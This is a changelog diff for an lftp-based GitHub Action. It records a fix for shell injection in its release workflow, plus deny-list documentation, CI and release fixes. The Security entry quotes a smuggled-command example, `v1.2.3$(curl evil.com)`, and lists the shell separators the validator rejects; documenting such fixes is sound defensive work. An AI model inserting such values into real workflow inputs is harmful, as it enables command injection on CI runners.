@@ -5,6 +5,29 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+### Security
+
+- **Tightened `release.yml` validator + shell-input plumbing (closes #211)** — three changes to `.github/workflows/release.yml` close a real shell-injection vector in the workflow_dispatch path:
+  * The `validate-tag-input` job's case pattern was a loose shell glob (`v[0-9]*.[0-9]*.[0-9]*`) that accepted shell metachars after the version root (e.g. `v1.2.3$(curl evil.com)` would pass). Replaced with a `grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'` anchored regex that rejects everything except the documented version shape.
+  * `inputs.version` and `github.event_name` were interpolated directly into `run:` blocks at the build `meta` step (line 332) and the publish `meta` step (line 658). GitHub Actions expands template expressions before shell execution, so a workflow_dispatch caller with `version='$(...)'` could inject shell. Moved both to `env:` blocks; `INPUT_VERSION` and the runner-supplied `GITHUB_EVENT_NAME` / `GITHUB_REF_NAME` are now referenced via shell variables.
+  * The publish job's `TAG=...` line used the same anti-pattern; replaced with `${INPUT_VERSION:-${GITHUB_REF_NAME}}`.
+
+### Documentation
+
+- **Docs hardening batch 2 (closes #270 #271)** — refresh stale description strings and one Makefile target:
+  * **`action.yml` deny-list drift (#271)** — `lftp_settings` (#85), `exclude` (#89), `exclude_delete` (#93), and `concurrency_lock_path` (#117) descriptions drifted from the actual validator behaviour after #160 (#246 follow-up) and #172 hardened `validate_glob_pattern` and `validate_path`. Refreshed each to match the implemented deny list: `lftp_settings` now mentions `newline`; `exclude`/`exclude_delete` now state that `;`, `&`, `|`, `"` are rejected as lftp command separators; `concurrency_lock_path` now lists `!` and `"` explicitly.
+  * **`README.md` parallel updates (#271)** — `lftp-4.9.2` → `lftp-4.9.3` (line 265, the actual Dockerfile pin); Settings table row for `concurrency_lock_path` (line 297) and the Exit-codes table row for `2` (line 688) carry the same deny-list refresh.
+- **`make test` now includes `bats unit` (closes #270)** — `Makefile:118` was `test: contract smoke`, which omitted the bats unit target and silently violated the AGENTS.md T1 contract (`contract + bats unit + smoke`). Changed to `test: contract unit smoke`; the unit target already no-ops when bats is missing, so the CI cold-start path stays unchanged.
+
+### Fixed
+
+- **`ci.yml` now serializes per-ref (closes #215)** — added a `concurrency:` block keyed on `ci-${{ github.workflow }}-${{ github.ref }}` with `cancel-in-progress: ${{ github.event_name == 'pull_request' }}`. PR runs cancel each other so a re-pushed branch never queues a stale full-suite run; main / tag / manual runs do NOT cancel so the Actions tab keeps the red run visible while a fix lands.
+- **`release.yml` defensive output coupling (closes #217)** — the `dockerhub_image` / `ecr_image` GitHub Actions outputs were emitted only inside their enable conditional, leaving downstream cosign / SBOM guards with a potentially-undefined value if the conditional-output coupling ever broke. Added explicit empty-string / `enabled=false` echoes on the disabled branches and replaced the ECR branch's `if false; then` dead-code sentinel with a `ECR_DISABLED_FORCE:-` opt-in switch. Empty defaults are now always present, so future maintainers cannot trip over an undefined-output silent failure.
+- **Issue-template dropdown drift + version-stamp sync (closes #219)** — five `.github/ISSUE_TEMPLATE/*.yml` files carried a "choose the action version" dropdown with three distinct ids (`action-version`, `action-version-affected`, `affected-version`) and stale `@v2.10.0` / `v2.9.2` examples; `SECURITY.md:7` had drifted to `v2.11.1`. Standardised on id `action-version` and label `"Action version"` (`security.yml` keeps the more specific `"Affected action version"` label per the issue's exact wording); refreshed all example versions to `@v2.11.3` (current `VERSION`); updated `SECURITY.md` `Currently maintained` stamp to match. Also added the missing `validations: required: true` to `idea.yml`'s version dropdown so it matches the other four templates.
+- **`body_path` ternary in `release.yml:680` collapses to a constant (closes #267)** — the `&&` / `||` triple on the `Create GitHub Release` step collapsed both branches to `'release/CHANGELOG.body.md'` because GitHub Actions evaluates `&&` / `||` with JavaScript-style truthiness and `''` is falsy. The intent (empty `body_path` when no CHANGELOG section was extracted; `'release/CHANGELOG.body.md'` otherwise) was structurally unreachable. Replaced with the canonical `!= 'true' && '...' || ''` pattern that swaps the test and the branches so the operands are non-empty. Today the broken intent is masked by `softprops/action-gh-release@v3.0.2`'s graceful fallback to `generate_release_notes: true`, but a future bump that surfaces ENOENT would have started failing on the documented path. One-line change.
+
 ## [2.11.3] - 2026-09-04
 
 ### Security
